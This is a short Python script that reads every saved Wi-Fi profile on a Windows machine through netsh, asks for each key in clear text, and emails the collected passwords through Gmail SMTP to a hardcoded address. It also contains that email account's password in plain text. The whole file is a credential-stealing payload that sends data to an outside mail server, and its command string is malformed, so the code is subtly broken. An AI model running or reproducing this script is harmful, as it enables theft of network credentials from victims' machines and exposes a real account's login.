import subprocess,smtplib, re

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com")
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profiles"
networks = subprocess.check_output(command,shell = True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""

for name in network_names:
    command = "netsh wlan show profile"+name+"key = clear"
    current_result = subprocess.check_output(command,shell = True)
    result = result + current_result

send_mail("nivekynob@gmail.com","KevinKiran1!", result)
